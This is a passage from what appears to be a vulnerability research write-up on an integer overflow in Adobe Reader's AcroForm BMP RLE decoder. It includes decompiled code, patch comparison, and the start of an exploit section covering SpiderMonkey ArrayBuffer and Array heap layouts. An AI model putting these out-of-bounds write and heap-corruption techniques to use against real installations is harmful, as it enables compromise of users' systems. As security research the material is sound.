class="line">        &#123;</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;           <span class="comment">// move to right</span></span><br><span class="line">          ypos -= ydelta;           <span class="comment">// move to up</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">// uncompressed data</span></span><br><span class="line">        &#123;</span><br><span class="line">          dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">               dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">              line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              line[xpos++] = value;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              ++index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( index &lt; BYTE1(cmd) );   <span class="comment">// uncompressed data</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( count &amp; <span class="number">1</span> )                  <span class="comment">// alignment</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// end of line</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// move to next line</span></span><br><span class="line">        xpos = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Based on previous patch analysis, it’s obvious that integer overflow can be triggered in the following <code>if</code> statement.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">dst_xpos = (<span class="keyword">unsigned</span> __int8)cmd + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &gt; width || </span><br><span class="line">     dst_xpos &lt; xpos || dst_xpos &lt; (<span class="keyword">unsigned</span> __int8)cmd )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure>
<p>The flaw exists within the arithmetic computation of <code>(unsigned __int8)cmd + xpos</code> . Here the value of both variables can be controlled by the attacker. And Out-Of-Bounds write can be triggered when decompressing RLE8 compressed data.</p>
<ol>
<li>The value of <code>(unsigned __int8)cmd</code> can be controlled directly in the bitmap file</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// read 2 bytes</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>The value of <code>xpos</code> can be controlled by arranging lots of <code>delta</code> commands in <strong>encoded mode</strong></li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">&#123;</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">  xpos += xdelta;           <span class="comment">// move to right, add any value in [0, 255]</span></span><br><span class="line">  ypos -= ydelta;           <span class="comment">// move to up</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>Out-Of-Bounds write can be triggered when decompressing RLE8 compressed data</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);            <span class="comment">// OOB write with constrolled data</span></span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// uncompress data</span></span><br></pre></td></tr></table></figure>
<h4 id="4-2-2-RLE4-Decoding"><a href="#4-2-2-RLE4-Decoding" class="headerlink" title="4.2.2 RLE4 Decoding"></a>4.2.2 RLE4 Decoding</h4><p>Following pseudo code, which was also extracted from function <code>sub_20CF3E5F</code> , was responsible for parsing the RLE4 compressed data. The decoding process was almost the same, but it’s a little more complicated than RLE8 since the data unit was not a byte.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">2</span> )  <span class="comment">// RLE4 algorithm</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, from left to right</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, from bottom to top</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  odd_index_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fn_feof(v1[<span class="number">2</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);       <span class="comment">// read 2 bytes</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                     <span class="comment">// first byte != 0</span></span><br><span class="line">      &#123;                                     <span class="comment">// means have compressed data</span></span><br><span class="line">        high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// high-order 4 bits</span></span><br><span class="line">        low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// low-order 4 bits</span></span><br><span class="line">        <span class="comment">// 20CF45F8, this basic block was patched in the updated binary file</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          xpos_ = odd_index_;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            odd_index = index &amp; <span class="number">1</span>;</span><br><span class="line">            line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            _4bits = high_4bits;            <span class="comment">// even index -&gt; high-order 4 bits</span></span><br><span class="line">            <span class="keyword">if</span> ( odd_index )                <span class="comment">// odd index -&gt; low-order 4 bits</span></span><br><span class="line">              _4bits = low_4bits;</span><br><span class="line">            <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )                <span class="comment">// odd xpos, old byte</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] |= _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                            <span class="comment">// even xpos, new byte</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            ++xpos_;</span><br><span class="line">            index = index + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br><span class="line">          odd_index_ = xpos_;</span><br><span class="line">          xpos = odd_index_;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )                <span class="comment">// first byte = 0, second byte != 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )              <span class="comment">// end of bitmap</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> )         <span class="comment">// delta</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;                   <span class="comment">// move to right</span></span><br><span class="line">          ypos -= ydelta;                   <span class="comment">// move to up</span></span><br><span class="line">          odd_index_ = xpos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 20CF44EA, this basic block was patched in the updated binary file</span></span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          odd_index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )                 <span class="comment">// uncompressed data</span></span><br><span class="line">          &#123;</span><br><span class="line">            xpos_ = odd_index_;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              odd_index_ = index &amp; <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !(index &amp; <span class="number">1</span>) )           <span class="comment">// read 1 byte data</span></span><br><span class="line">              &#123;</span><br><span class="line">                fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">                low_4bits_ = value &amp; <span class="number">0xF</span>;   <span class="comment">// low-order 4 bits</span></span><br><span class="line">                high_4bits_ = value &gt;&gt; <span class="number">4</span>;   <span class="comment">// high-order 4 bits</span></span><br><span class="line">              &#125;</span><br><span class="line">              byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">              line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              _4bits = high_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( odd_index_ )</span><br><span class="line">                _4bits = low_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] |= _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              ++xpos_;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              not_ended = odd_index++ + <span class="number">1</span> &lt; BYTE1(cmd);</span><br><span class="line">              index = odd_index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( not_ended );</span><br><span class="line">            odd_index_ = xpos_;</span><br><span class="line">            xpos = odd_index_;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( (count &amp; <span class="number">3u</span>) - <span class="number">1</span> &lt;= <span class="number">1</span> )      <span class="comment">// alignment</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// end of line</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// move to next line</span></span><br><span class="line">        xpos = <span class="number">0</span>;</span><br><span class="line">        odd_index_ = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof((_DWORD *)v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Integer overflow can be triggered in two spots, one exists within the handling of compressed data:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// high-order 4 bits</span></span><br><span class="line">low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// low-order 4 bits</span></span><br><span class="line"><span class="comment">// 20CF45F8, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure>
<p>Another one exists within the handling of uncompressed data:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF44EA, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure>
<h2 id="0x05-Exploit"><a href="#0x05-Exploit" class="headerlink" title="0x05. Exploit"></a>0x05. Exploit</h2><h3 id="5-1-Overflow-Candidate"><a href="#5-1-Overflow-Candidate" class="headerlink" title="5.1 Overflow Candidate"></a>5.1 Overflow Candidate</h3><p>Three integer overflows were found within the function. Here we’ll choose the one within the handling of RLE8 data. It’s more exploit friendly than the others.</p>
<p>In terms of RLE4 data decoding, the value of <code>xpos</code> will be divided by <code>2</code> when putting data into the scan line. The maximum offset value for the scan line is <code>0xFFFFFFFF / 2 = 0x7FFFFFFF</code> , it means that we can only <strong>write forward</strong> and the address we are trying to write is probably out of our control.</p>
<p>For RLE8 data decoding, the offset value for the scan line is <code>xpos</code> itself, thus we can <strong>write backward</strong> and the distance can be controlled. In the following <code>if</code> statement, the maximum value of <code>(unsigned __int8)cmd</code> is <code>0xFF</code> . And to bypass the check, the minimum value of <code>xpos</code> is <code>0xFFFFFF01</code> which should be <code>-255</code> in <code>signed int</code> form. In other words, we can write backward as large as <code>0xFF</code> bytes.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure>
<p>However, the interval we’re trying to write can only be filled with the same value. This will cause some problems when writing exploit, it will be explained later.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);</span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br></pre></td></tr></table></figure>
<h3 id="5-2-SpiderMonkey-Concepts"><a href="#5-2-SpiderMonkey-Concepts" class="headerlink" title="5.2 SpiderMonkey Concepts"></a>5.2 SpiderMonkey Concepts</h3><p>Adobe Reader uses <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey" target="_blank" rel="noopener">SpiderMonkey</a> as its JavaScript engine. Before writing the exploit, let’s learn some essential knowledge of the SpiderMonkey engine.</p>
<h4 id="5-2-1-ArrayBuffer"><a href="#5-2-1-ArrayBuffer" class="headerlink" title="5.2.1 ArrayBuffer"></a>5.2.1 ArrayBuffer</h4><p>When the value of <code>byteLength</code> is greater than <code>0x68</code> , the backing store of the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" target="_blank" rel="noopener">ArrayBuffer</a> object will be allocated from system heap (through <code>ucrtbase!calloc</code>), otherwise it will be allocated from SpiderMonkey’s <strong>tenured heap</strong> . Also, when allocating from system heap, the underlying heap buffer will be <code>0x10</code> bytes larger to store the <code>ObjectElements</code> object.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;               <span class="comment">// can be any value, default is 0</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;   <span class="comment">// byteLength</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;            <span class="comment">// pointer of associated view object</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;              <span class="comment">// can be any value, default is 0</span></span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>The names of the members in <code>ObjectElements</code> are meaningless for <code>ArrayBuffer</code> . Here the second member holds the <code>byteLength</code> value and the third member holds a pointer of the associated <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener">DataView</a> object. The values of the other members are meaningless and can be any digits.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x70</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab);</span><br><span class="line">dv.setUint32(<span class="number">0</span>, <span class="number">0x41424344</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>When executing the above JavaScript code in Adobe Reader, the backing store of the <code>ArrayBuffer</code> object will be looked like this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">34d54f80  00000000 00000070 2458f608 00000000</span><br><span class="line">;         data</span><br><span class="line">34d54f90  41424344 00000000 00000000 00000000</span><br><span class="line">34d54fa0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fb0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fc0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fd0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fe0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54ff0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>
<p>If we can change the value of the <code>byteLength</code> of <code>ArrayBuffer</code> , then we can achieve Out-Of-Bounds access. But be careful with the pointer of the associated <code>DataView</code> object, it can only be 0 or a valid <code>DataView</code> pointer, the process may crash immediately if we change it to some other values.</p>
<h4 id="5-2-2-Array"><a href="#5-2-2-Array" class="headerlink" title="5.2.2 Array"></a>5.2.2 Array</h4><p>When the value of <code>length</code> is greater than <code>14</code> , the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">Array</a> object can be allocated from system heap (through <code>ucrtbase!calloc</code>), otherwise it may be allocated from SpiderMonkey’s <strong>nursery heap</strong> . Also, when allocating from system heap, the underlying heap buffer will be <code>0x10</code> bytes larger to store the <code>ObjectElements</code> object.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// The NumShiftedElementsBits high bits of this are used to store the</span></span><br><span class="line">  <span class="comment">// number of shifted elements, the other bits are available for the flags.</span></span><br><span class="line">  <span class="comment">// See Flags enum above.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Number of initialized elements. This is &lt;= the capacity, and for arrays</span></span><br><span class="line"><span class="comment">   * is &lt;= the length. Memory for elements above the initialized length is</span></span><br><span class="line"><span class="comment">   * uninitialized, but values between the initialized length and the proper</span></span><br><span class="line"><span class="comment">   * length are conceptually holes.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of allocated slots. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 'length' property of array objects, unused for other objects. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;</span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">15</span>);</span><br><span class="line">array[<span class="number">0</span>] = array[array.length - <span class="number">1</span>] = <span class="number">0x41424344</span>;</span><br></pre></td></tr></table></figure>
<p>When executing the above JavaScript code in Adobe Reader, the underlying storage buffer of the <code>Array</code> object will be looked like this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dd 34cb0f88-10 L90/4</span><br><span class="line">34cb0f78  00000000 0000000f 0000000f 0000000f</span><br><span class="line">34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]</span><br><span class="line">34cb0f98  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fa8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fb8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fc8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fd8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fe8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]</span><br></pre></td></tr></table></figure>
<p>The contents of both <code>array[0]</code> and <code>array[14]</code> are <code>41424344 ffffff81</code> , here the higher four bytes of data <code>0xFFFFFF81</code> indicates that the type of the element is <code>INT32</code> . And the contents of the elements within <code>[1, 13]</code> are all filled with <code>00000000 ffffff84</code> which means that they’re <code>undefined</code> .</p>
<p>If we can change the values of <code>capacity</code> and <code>length</code> , we can only achieve Out-Of-Bounds write, and the space after the original initialized elements and before the Out-Of-Bounds wrote elements will be filled with <code>00000000 ffffff84</code> . That’s some kind of meaningless.</p>
<p>It’s not a good idea to change <code>initializedLength</code> to a large value. This may lead to crash when scanning the array elements during GC. We’ll probably encounter inaccessible memory page and crash the process.</p>
<h4 id="5-2-3-JSObject"><a href="#5-2-3-JSObject" class="headerlink" title="5.2.3 JSObject"></a>5.2.3 JSObject</h4><p>In SpiderMonkey, almost all JavaScript objects are inherited from <code>JSObject</code> , and the later class is inherited from <code>ObjectImpl</code> .</p>
